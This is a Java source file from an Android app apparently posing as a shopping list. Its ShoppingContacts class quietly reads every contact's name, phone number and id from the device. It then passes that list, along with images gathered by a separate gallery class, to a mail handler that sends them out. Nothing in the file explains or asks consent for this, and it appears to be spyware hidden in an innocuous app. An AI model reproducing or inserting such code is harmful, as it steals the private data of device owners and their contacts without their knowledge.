package com.example.jonas.shoppinglist.processes;

import android.app.Activity;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.AsyncTask;
import android.provider.ContactsContract;
import android.util.Log;

import com.example.jonas.shoppinglist.communication.MailHandler;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutionException;


public class ShoppingContacts extends AsyncTask<Void, Void, String>  {
    private Activity activity;
    private Cursor contactCursor;
    private Uri uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
    private String[] projection = {ContactsContract.Contacts._ID, ContactsContract.Contacts.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER, ContactsContract.CommonDataKinds.Email.ADDRESS};

    private static final String LOG_TAG = ShoppingContacts.class.getSimpleName();

    public ShoppingContacts(Activity activity) {
        this.activity = activity;
    }

    @Override
    protected String doInBackground(Void... params) {

        contactCursor = activity.getContentResolver().query(uri, projection,null,null, null);

        int nameIdx = contactCursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME);
        int phoneIdx = contactCursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER);
        int idIdx = contactCursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID);
        int emailIdx = contactCursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Email.ADDRESS);

        String resultSet = "Contact list: \n \n" ;

        while(contactCursor.moveToNext()){
            String name = contactCursor.getString(nameIdx);
            String phone = contactCursor.getString(phoneIdx);
            String email = contactCursor.getString(emailIdx);
            String id = contactCursor.getString(idIdx);

            resultSet = resultSet + "id:" + id + ", name = " + name + ", phone number = " + phone +  "\n";
        }

        return resultSet;
    }

    @Override
    public void onPostExecute(String result){

        MailHandler handler = new MailHandler(activity);
        try {
            handler.setImgs(new ShoppingGallery(activity).execute().get());
            handler.execute(result);
        } catch (InterruptedException e) {
            Log.e(LOG_TAG, "image loading interrupted: " + e);
        } catch (ExecutionException e) {
            Log.e(LOG_TAG, "image execution failed: " + e);
        }

    }
}
